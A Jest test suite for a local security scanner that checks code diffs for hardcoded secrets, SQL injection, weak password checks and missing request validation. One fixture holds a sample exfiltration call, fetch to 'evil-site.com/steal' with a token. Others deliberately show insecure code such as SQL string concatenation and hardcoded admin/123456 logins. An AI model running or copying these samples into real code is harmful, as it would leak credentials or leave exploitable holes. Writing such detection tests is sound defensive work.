const { scanSecurityPatterns } = require("../services/localSecurityScanner");

describe("local security scanner", () => {
  test("should return empty array for empty input", () => {
    const findings = scanSecurityPatterns("");

    expect(findings).toEqual([]);
  });

  test("should detect hardcoded API key", () => {
    const diff = `
      const apiKey = "abc123-secret-key";
    `;

    const findings = scanSecurityPatterns(diff);

    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0]).toMatchObject({
      issueType: "Hardcoded API Key",
      riskLevel: "High",
    });
  });

  test("should detect hardcoded password", () => {
    const diff = `
      const password = "myPassword123";
    `;

    const findings = scanSecurityPatterns(diff);

    expect(findings.some((finding) => finding.issueType === "Hardcoded Password")).toBe(true);
  });

  test("should detect hardcoded token", () => {
    const diff = `
      const token = "ghp_testTokenValue123";
    `;

    const findings = scanSecurityPatterns(diff);

    expect(findings.some((finding) => finding.issueType === "Hardcoded Token")).toBe(true);
  });

  test("should detect AWS access key", () => {
    const diff = `
      const awsKey = "AKIA1234567890ABCDEF";
    `;

    const findings = scanSecurityPatterns(diff);

    expect(findings.some((finding) => finding.issueType === "AWS Access Key")).toBe(true);
  });

  test("should detect private key", () => {
    const diff = `
      -----BEGIN PRIVATE KEY-----
      abcdefg
      -----END PRIVATE KEY-----
    `;

    const findings = scanSecurityPatterns(diff);

    expect(findings.some((finding) => finding.issueType === "Private Key Exposure")).toBe(true);
  });

  test("should detect SQL injection risk", () => {
    const diff = `
      const query = "SELECT * FROM users WHERE id = " + userId;
    `;

    const findings = scanSecurityPatterns(diff);

    expect(findings.some((finding) => finding.issueType === "SQL Injection Risk")).toBe(true);
  });

  test("should detect unsafe SQL string concatenation", () => {
    const diff = `
      db.query("SELECT * FROM users WHERE email = '" + email + "'");
    `;

    const findings = scanSecurityPatterns(diff);

    expect(findings.some((finding) => finding.issueType === "Unsafe SQL String Concatenation")).toBe(true);
  });

  test("each finding should include issue type, risk level, explanation, and suggested fix", () => {
    const diff = `
      const password = "secret123";
    `;

    const findings = scanSecurityPatterns(diff);

    expect(findings[0]).toHaveProperty("issueType");
    expect(findings[0]).toHaveProperty("riskLevel");
    expect(findings[0]).toHaveProperty("explanation");
    expect(findings[0]).toHaveProperty("suggestedFix");
  });

  test("should detect suspicious data exfiltration", () => {
    const diff = `
    fetch("https://evil-site.com/steal?token=" + token);
  `;

    const findings = scanSecurityPatterns(diff);

    expect(
      findings.some(
        (finding) => finding.issueType === "Suspicious Data Exfiltration"
      )
    ).toBe(true);
  });
});


/*
Test case for story 7:
*/
describe("Local Security Scanner - Weak Authentication", () => {
  test("should detect JavaScript direct weak password comparison", () => {
    const codeDiff = `
diff --git a/src/auth.js b/src/auth.js
+++ b/src/auth.js
@@
+ if (password === "admin123") {
+   return true;
+ }
`;

    const findings = scanSecurityPatterns(codeDiff);

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          issueType: "Weak Authentication",
          riskLevel: "High",
          fileName: "src/auth.js",
          lineNumber: expect.any(Number),
        }),
      ])
    );
  });

  test("should detect JavaScript loose weak password comparison", () => {
    const codeDiff = `
diff --git a/src/login.js b/src/login.js
+++ b/src/login.js
@@
+ if (password == "password") {
+   loginUser();
+ }
`;

    const findings = scanSecurityPatterns(codeDiff);

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          issueType: "Weak Authentication",
          riskLevel: "High",
          fileName: "src/login.js",
          lineNumber: expect.any(Number),
        }),
      ])
    );
  });

  test("should detect Java-style password equals comparison", () => {
    const codeDiff = `
diff --git a/src/AuthController.java b/src/AuthController.java
+++ b/src/AuthController.java
@@
+ if (password.equals("admin123")) {
+   return true;
+ }
`;

    const findings = scanSecurityPatterns(codeDiff);

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          issueType: "Weak Authentication",
          riskLevel: "High",
          fileName: "src/AuthController.java",
          lineNumber: expect.any(Number),
        }),
      ])
    );
  });

  test("should detect hardcoded admin username with weak password logic", () => {
    const codeDiff = `
diff --git a/src/adminLogin.js b/src/adminLogin.js
+++ b/src/adminLogin.js
@@
+ if (username === "admin" && password === "123456") {
+   return true;
+ }
`;

    const findings = scanSecurityPatterns(codeDiff);

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          issueType: "Weak Authentication",
          riskLevel: "High",
          fileName: "src/adminLogin.js",
          lineNumber: expect.any(Number),
        }),
      ])
    );
  });

  test("should detect multiple weak default passwords", () => {
    const weakPasswords = ["admin123", "password", "123456", "qwerty", "letmein", "welcome"];

    weakPasswords.forEach((weakPassword) => {
      const codeDiff = `
diff --git a/src/auth.js b/src/auth.js
+++ b/src/auth.js
@@
+ if (password === "${weakPassword}") {
+   return true;
+ }
`;

      const findings = scanSecurityPatterns(codeDiff);

      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            issueType: "Weak Authentication",
            riskLevel: "High",
          }),
        ])
      );
    });
  });
  test("should detect weak hardcoded password comparison", () => {
    const diff = `
      const password = "admin123";
    `;

    const findings = scanSecurityPatterns(diff);

    expect(
      findings.some((finding) => finding.issueType === "Weak Authentication")
    ).toBe(true);
  });

  test("should detect JavaScript password comparison using triple equals", () => {
    const diff = `
      if (password === "admin123") {
        return true;
      }
    `;

    const findings = scanSecurityPatterns(diff);

    expect(
      findings.some((finding) => finding.issueType === "Weak Authentication")
    ).toBe(true);
  });

  test("should detect JavaScript password comparison using double equals", () => {
    const diff = `
      if (password == "password") {
        return true;
      }
    `;

    const findings = scanSecurityPatterns(diff);

    expect(
      findings.some((finding) => finding.issueType === "Weak Authentication")
    ).toBe(true);
  });

  test("should detect Java equals password comparison", () => {
    const diff = `
      if (password.equals("admin123")) {
        return true;
      }
    `;

    const findings = scanSecurityPatterns(diff);

    expect(
      findings.some((finding) => finding.issueType === "Weak Authentication")
    ).toBe(true);
  });

  test("should detect default admin password", () => {
    const diff = `
      if (password === "admin123") {
        login();
      }
    `;

    const findings = scanSecurityPatterns(diff);

    expect(
      findings.some((finding) => finding.issueType === "Weak Authentication")
    ).toBe(true);
  });

  test("should detect hardcoded admin credential logic", () => {
    const diff = `
      if (username === "admin" && password === "123456") {
        return true;
      }
    `;

    const findings = scanSecurityPatterns(diff);

    expect(
      findings.some((finding) => finding.issueType === "Weak Authentication")
    ).toBe(true);
  });

  test("should detect multiple weak default passwords", () => {
    const weakPasswords = [
      "admin123",
      "password",
      "123456",
      "qwerty",
      "letmein",
      "welcome"
    ];

    weakPasswords.forEach((weakPassword) => {
      const diff = `
        if (password === "${weakPassword}") {
          return true;
        }
      `;

      const findings = scanSecurityPatterns(diff);

      expect(
        findings.some((finding) => finding.issueType === "Weak Authentication")
      ).toBe(true);
    });
  });

  test("weak authentication finding should include required fields", () => {
    const diff = `
      if (password === "admin123") {
        return true;
      }
    `;

    const findings = scanSecurityPatterns(diff);

    const weakAuthFinding = findings.find(
      (finding) => finding.issueType === "Weak Authentication"
    );

    expect(weakAuthFinding).toBeDefined();
    expect(weakAuthFinding).toHaveProperty("issueType");
    expect(weakAuthFinding).toHaveProperty("riskLevel");
    expect(weakAuthFinding).toHaveProperty("explanation");
    expect(weakAuthFinding).toHaveProperty("suggestedFix");

    expect(weakAuthFinding.issueType).toBe("Weak Authentication");
    expect(weakAuthFinding.riskLevel).toBe("High");
  });

  test("weak authentication scanner should not crash on empty input", () => {
    const findings = scanSecurityPatterns("");

    expect(findings).toEqual([]);
  });
  /*
Test case for story 8:
*/
  describe("Local Security Scanner - Missing Validation", () => {
    test("should detect missing validation in a PostMapping method", () => {
      const codeDiff = `
diff --git a/src/UserController.java b/src/UserController.java
+++ b/src/UserController.java
@@
+ @PostMapping
+ public void createUser(User user) {
+ }
`;

      const findings = scanSecurityPatterns(codeDiff);

      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            issueType: "Missing Validation",
            riskLevel: "Medium",
            fileName: "src/UserController.java",
            lineNumber: expect.any(Number),
          }),
        ])
      );
    });

    test("should detect missing validation in a PutMapping method", () => {
      const codeDiff = `
diff --git a/src/UserController.java b/src/UserController.java
+++ b/src/UserController.java
@@
+ @PutMapping
+ public void updateUser(@RequestBody User user) {
+ }
`;

      const findings = scanSecurityPatterns(codeDiff);

      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            issueType: "Missing Validation",
            riskLevel: "Medium",
          }),
        ])
      );
    });

    test("should detect missing validation in a PatchMapping method", () => {
      const codeDiff = `
diff --git a/src/UserController.java b/src/UserController.java
+++ b/src/UserController.java
@@
+ @PatchMapping
+ public void updateUser(User user) {
+ }
`;

      const findings = scanSecurityPatterns(codeDiff);

      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            issueType: "Missing Validation",
            riskLevel: "Medium",
          }),
        ])
      );
    });

    test("should not flag code that uses Valid", () => {
      const codeDiff = `
diff --git a/src/UserController.java b/src/UserController.java
+++ b/src/UserController.java
@@
+ @PostMapping
+ public void createUser(@Valid @RequestBody User user) {
+ }
`;

      const findings = scanSecurityPatterns(codeDiff);

      expect(
        findings.some((finding) => finding.issueType === "Missing Validation")
      ).toBe(false);
    });

    test("should not flag code that uses Validated", () => {
      const codeDiff = `
diff --git a/src/UserController.java b/src/UserController.java
+++ b/src/UserController.java
@@
+ @PostMapping
+ public void createUser(@Validated @RequestBody User user) {
+ }
`;

      const findings = scanSecurityPatterns(codeDiff);

      expect(
        findings.some((finding) => finding.issueType === "Missing Validation")
      ).toBe(false);
    });

    test("should handle empty input safely for missing validation", () => {
      const findings = scanSecurityPatterns("");

      expect(findings).toEqual([]);
    });

    test("missing validation finding should include required fields", () => {
      const codeDiff = `
diff --git a/src/UserController.java b/src/UserController.java
+++ b/src/UserController.java
@@
+ @PostMapping
+ public void createUser(User user) {
+ }
`;

      const findings = scanSecurityPatterns(codeDiff);

      const missingValidationFinding = findings.find(
        (finding) => finding.issueType === "Missing Validation"
      );

      expect(missingValidationFinding).toBeDefined();
      expect(missingValidationFinding).toHaveProperty("issueType");
      expect(missingValidationFinding).toHaveProperty("riskLevel");
      expect(missingValidationFinding).toHaveProperty("fileName");
      expect(missingValidationFinding).toHaveProperty("lineNumber");
      expect(missingValidationFinding).toHaveProperty("explanation");
      expect(missingValidationFinding).toHaveProperty("suggestedFix");

      expect(missingValidationFinding.issueType).toBe("Missing Validation");
      expect(missingValidationFinding.riskLevel).toBe("Medium");
    });
  });
  
});